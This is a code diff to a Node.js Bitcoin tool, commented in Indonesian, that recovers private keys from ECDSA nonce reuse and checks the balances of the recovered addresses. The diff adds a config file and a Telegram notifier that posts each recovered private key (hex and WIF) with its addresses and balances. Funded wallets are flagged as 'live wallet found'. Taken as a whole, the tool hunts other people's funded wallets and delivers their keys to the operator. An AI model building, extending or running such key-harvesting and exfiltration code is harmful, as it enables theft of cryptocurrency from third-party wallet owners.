@@ -6,7 +6,34 @@ import { readFileSync, appendFileSync, writeFileSync, existsSync, mkdirSync, rmS
 import { createInterface } from "node:readline/promises";
 import { stdin as input, stdout as output } from "node:process";
 
-const DEFAULT_API = "https://mempool.space/api";
+// ============================================================
+// Config (config.json di root, semua field opsional)
+// ============================================================
+const CONFIG_FILE = "config.json";
+const DEFAULT_CONFIG = {
+  api: "https://mempool.space/api",
+  concurrency: 8,
+  hitsFile: "hits.txt",
+  cache: { enabled: true, listMaxAgeHours: 6 },
+  telegram: { enabled: false, botToken: "", chatId: "", notifyOnLiveOnly: true },
+};
+function loadConfig() {
+  if (!existsSync(CONFIG_FILE)) return DEFAULT_CONFIG;
+  try {
+    const raw = JSON.parse(readFileSync(CONFIG_FILE, "utf8"));
+    return {
+      ...DEFAULT_CONFIG,
+      ...raw,
+      cache: { ...DEFAULT_CONFIG.cache, ...(raw.cache || {}) },
+      telegram: { ...DEFAULT_CONFIG.telegram, ...(raw.telegram || {}) },
+    };
+  } catch (e) {
+    console.error("Peringatan: config.json tidak valid (" + e.message + "), pakai default.");
+    return DEFAULT_CONFIG;
+  }
+}
+const CONFIG = loadConfig();
+const DEFAULT_API = CONFIG.api;
 
 // ============================================================
 // Utilitas hex/bytes
@@ -603,6 +630,35 @@ async function detectReuse(sigs, opts = {}) {
          (bU.balanceSat > 0 ? c(C.green + C.bold, formatBTC(bU.balanceSat)) : c(C.dim, "0 BTC")) +
          c(C.dim, "  total diterima: " + formatBTC(bU.totalReceivedSat) + ", " + bU.txCount + " tx")));
     }
+
+    // Notifikasi Telegram (jika diaktifkan di config.json)
+    if (CONFIG.telegram.enabled) {
+      const onlyLive = CONFIG.telegram.notifyOnLiveOnly !== false;
+      const targets = onlyLive
+        ? recovered.filter((h) =>
+            (h.balanceCompressed && h.balanceCompressed.balanceSat > 0) ||
+            (h.balanceUncompressed && h.balanceUncompressed.balanceSat > 0))
+        : recovered;
+      for (const h of targets) {
+        const liveC = h.balanceCompressed && h.balanceCompressed.balanceSat > 0;
+        const liveU = h.balanceUncompressed && h.balanceUncompressed.balanceSat > 0;
+        const tag = (liveC || liveU) ? "🚨 *WALLET HIDUP DITEMUKAN*" : "🔑 *Private key dipulihkan*";
+        const lines = [
+          tag,
+          h.scannedAddress ? "Scan: `" + h.scannedAddress + "`" : null,
+          "Priv (hex): `" + h.privHex + "`",
+          "WIF (comp): `" + h.wifCompressed + "`",
+          "Addr (comp): `" + h.addressCompressed + "`" +
+            (h.balanceCompressed && h.balanceCompressed.balanceSat > 0
+              ? " — *" + formatBTC(h.balanceCompressed.balanceSat) + "*" : ""),
+          "Addr (uncmp): `" + h.addressUncompressed + "`" +
+            (h.balanceUncompressed && h.balanceUncompressed.balanceSat > 0
+              ? " — *" + formatBTC(h.balanceUncompressed.balanceSat) + "*" : ""),
+          "TXID: " + (h.txids || []).slice(0, 4).map((t) => "`" + t.slice(0, 16) + "…`").join(", "),
+        ].filter(Boolean);
+        await notifyTelegram(lines.join("\n"));
+      }
+    }
   }
 
   if (recovered.length && opts.saveHits !== false) {
@@ -681,6 +737,34 @@ async function detectReuse(sigs, opts = {}) {
   return recovered;
 }
 
+// ============================================================
+// Telegram notification (opsional, dari config.json)
+// ============================================================
+async function notifyTelegram(text) {
+  const t = CONFIG.telegram;
+  if (!t || !t.enabled || !t.botToken || !t.chatId) return;
+  try {
+    const url = "https://api.telegram.org/bot" + t.botToken + "/sendMessage";
+    const r = await fetch(url, {
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify({
+        chat_id: t.chatId,
+        text,
+        parse_mode: "Markdown",
+        disable_web_page_preview: true,
+      }),
+    });
+    if (!r.ok) {
+      console.log(c(C.yellow, "Telegram gagal: HTTP " + r.status));
+    } else {
+      console.log(c(C.dim, "Telegram terkirim ke chat " + t.chatId));
+    }
+  } catch (e) {
+    console.log(c(C.yellow, "Telegram error: " + e.message));
+  }
+}
+
 // WIF (mainnet, compressed)
 function toWIF(d, prefix = 0x80, compressed = true) {
   const key = hexToBytes(padHex(d));
@@ -735,7 +819,7 @@ async function esploraFetch(base, path) {
 const CACHE_DIR = ".btc-cache";
 const CACHE_TX = CACHE_DIR + "/tx";
 const CACHE_LIST = CACHE_DIR + "/addr";
-let CACHE_ENABLED = true;
+let CACHE_ENABLED = CONFIG.cache.enabled;
 let CACHE_STATS = { hexHits: 0, hexMisses: 0, listHits: 0, listMisses: 0 };
 
 function ensureCacheDir() {
@@ -916,7 +1000,7 @@ async function analyzeAddress(address, opts) {
 
   let txs;
   const cached = loadAddressListCache(address);
-  const useCachedList = cached && (Date.now() - cached.ts) < (opts.listMaxAgeMs || 6 * 3600 * 1000);
+  const useCachedList = cached && (Date.now() - cached.ts) < (opts.listMaxAgeMs || CONFIG.cache.listMaxAgeHours * 3600 * 1000);
   if (useCachedList) {
     CACHE_STATS.listHits++;
     const ageMin = ((Date.now() - cached.ts) / 60000).toFixed(1);
@@ -1047,6 +1131,21 @@ Opsi:
   --no-cache                             Nonaktifkan cache lokal
   clear-cache                            Hapus seluruh isi folder .btc-cache/
 
+Konfigurasi (config.json di root, opsional):
+  {
+    "api": "https://mempool.space/api",
+    "concurrency": 8,
+    "hitsFile": "hits.txt",
+    "cache": { "enabled": true, "listMaxAgeHours": 6 },
+    "telegram": {
+      "enabled": true,
+      "botToken": "123456:ABC...",
+      "chatId": "123456789",
+      "notifyOnLiveOnly": true
+    }
+  }
+  Bot Telegram dibuat lewat @BotFather; chatId via @userinfobot.
+
 Yang dianalisis dari setiap input:
   • R, S          (komponen ECDSA dari DER signature)
   • Z             (message hash / sighash)
@@ -1112,10 +1211,10 @@ async function interactiveMenu() {
       rl.close();
       await analyzeAddress(addr, {
         api: apiIn || DEFAULT_API,
-        concurrency: conIn ? Math.max(1, parseInt(conIn, 10)) : 8,
+        concurrency: conIn ? Math.max(1, parseInt(conIn, 10)) : CONFIG.concurrency,
         verbose: verIn === "y" || verIn === "ya",
         out: outIn || null,
-        hitsFile: hitsIn || "hits.txt",
+        hitsFile: hitsIn || CONFIG.hitsFile,
       });
     } else if (choice === "2") {
       const txid = (await ask("TXID                : ")).trim();
@@ -1190,8 +1289,8 @@ async function main() {
       api: getOpt("api"),
       verbose: hasFlag("verbose"),
       out: getOpt("out"),
-      hitsFile: getOpt("hits") || "hits.txt",
-      concurrency: getOpt("concurrency") ? Math.max(1, parseInt(getOpt("concurrency"), 10)) : 8,
+      hitsFile: getOpt("hits") || CONFIG.hitsFile,
+      concurrency: getOpt("concurrency") ? Math.max(1, parseInt(getOpt("concurrency"), 10)) : CONFIG.concurrency,
     });
   } else if (cmd === "tx" || cmd === "tx-file") {
     const hex =
